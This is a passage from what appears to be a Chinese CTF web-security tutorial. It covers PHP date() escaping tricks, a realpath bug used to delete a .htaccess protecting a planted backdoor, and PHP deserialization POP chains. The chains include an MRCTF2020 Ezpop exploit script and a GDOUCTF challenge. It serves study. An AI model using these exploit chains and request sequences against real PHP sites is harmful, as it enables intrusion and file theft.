timestamp)</code><br>其中timestamp有默认值time()一般不考虑。<br>关键在第一个参数，他会按照“Y为年，M为月”等一系列格式化参数，来将time()的值转化为格式化的日期。如<br>date(“Y-m-d h:i:m”);</p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/10.png" title="wuhu"><p>而想要将字符原样输出，不参与日期格式化，则可以用反斜杠来进行转义</p><p><code>date(&quot;\T\a\d\a\y \i\s Y-m-d h:i:m&quot;);</code></p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/11.png" title="wuhu"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;f\l\a\g&quot;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>这类属于可能存在的逻辑漏洞</p><h4 id="realpath导致的文件异常删除"><a href="#realpath导致的文件异常删除" class="headerlink" title="realpath导致的文件异常删除"></a>realpath导致的文件异常删除</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2023强网拟态</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$htContent</span> = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;Files &quot;backdoor.php&quot;&gt;</span></span><br><span class="line"><span class="string">    Deny from all</span></span><br><span class="line"><span class="string">&lt;/Files&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;create&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;/flag&quot;);@unlink(__FILE__);&#x27;</span>;</span><br><span class="line"><span class="variable">$subdir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;subdir&#x27;</span>] ?? <span class="string">&#x27;/jsons&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/\.?[a-z]+$/&#x27;</span>, <span class="variable">$subdir</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$subdir</span>) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;....&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$jsonDir</span> = <span class="variable">$dir</span> . <span class="variable">$subdir</span>;</span><br><span class="line"><span class="variable">$escapeDir</span> = <span class="string">&#x27;/var/www/html&#x27;</span> . <span class="variable">$subdir</span>; </span><br><span class="line"><span class="variable">$archiveFile</span> = <span class="variable">$jsonDir</span> . <span class="string">&#x27;/archive.zip&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;create&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// create jsons/api.json</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$jsonDir</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$jsonDir</span>. <span class="string">&#x27;/backdoor.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$jsonDir</span>.<span class="string">&#x27;/.htaccess&#x27;</span>,<span class="variable">$htContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">delete</span>(<span class="variable">$archiveFile</span>);</span><br><span class="line">    <span class="comment">// create archive.zip</span></span><br><span class="line">    <span class="variable">$dev_dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dev&#x27;</span>] ?? <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">realpath</span>(<span class="variable">$dev_dir</span>) !== <span class="variable">$dir</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;...&#x27;</span>);</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$archiveFile</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addGlob</span>(<span class="variable">$jsonDir</span> . <span class="string">&#x27;/**&#x27;</span>, <span class="number">0</span>, [<span class="string">&#x27;add_path&#x27;</span> =&gt; <span class="string">&#x27;var/www/html/&#x27;</span>, <span class="string">&#x27;remove_path&#x27;</span> =&gt; <span class="variable">$dev_dir</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addGlob</span>(<span class="variable">$jsonDir</span> . <span class="string">&#x27;/.htaccess&#x27;</span>, <span class="number">0</span>, [<span class="string">&#x27;add_path&#x27;</span> =&gt; <span class="string">&#x27;var/www/html/&#x27;</span>, <span class="string">&#x27;remove_path&#x27;</span> =&gt; <span class="variable">$dev_dir</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;unzip&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$archiveFile</span>))&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$archiveFile</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;clean&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$escapeDir</span>))</span><br><span class="line">        <span class="title function_ invoke__">delete</span>(<span class="variable">$escapeDir</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed.(/var/www/html)&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$jsonDir</span>))</span><br><span class="line">        <span class="title function_ invoke__">delete</span>(<span class="variable">$jsonDir</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed.(/tmp)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>))</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>)) </span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以利用<code>realpath($dev_dir) == $dir</code>构造 <code>dev=/tmp/.</code> 删除.htaccess。</p><p>创建和解压也&#x2F;tmp作为目录</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?action=create&amp;subdir=/tmp</span><br><span class="line">?action=zip&amp;subdir=/tmp&amp;dev=/tmp/.</span><br><span class="line">?action=unzip&amp;subdir=/tmp</span><br></pre></td></tr></table></figure><p>解压后就没有.htaccess了</p><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><blockquote><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p></blockquote><ol><li>常见的魔术方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h4 id="一般类型"><a href="#一般类型" class="headerlink" title="一般类型"></a>一般类型</h4><p>示例题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MRCTF2020-Ezpop</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然构造链子<code>__wakeup() -&gt; __toString() -&gt; __get -&gt; __invoke()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = flag.txt;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$b</span>;<span class="comment">//通过将$b这个类当作字符串赋值，调动__toString</span></span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="keyword">new</span> <span class="title class_">Test</span>();<span class="comment">//读取不存在的$b -&gt; str -&gt; source调动__get</span></span><br><span class="line">(<span class="variable">$b</span> -&gt; str) -&gt; p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();<span class="comment">//将($b -&gt; str) -&gt; p作函数调用，调动__invoke()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//把不可打印字符编码</span></span><br></pre></td></tr></table></figure><h4 id="使用php原生类"><a href="#使用php原生类" class="headerlink" title="使用php原生类"></a>使用php原生类</h4><ol><li>例如</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[GDOUCTF 2023]反方向的钟</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一道反序列化，链子：<code>__wakeup-&gt;hahaha()-&gt;IPO()-&gt;echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);</code></p><p>然后调用php的内置类SplFileObject来读取文件内容，但是读取之后没有输出，所以使用伪协议输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 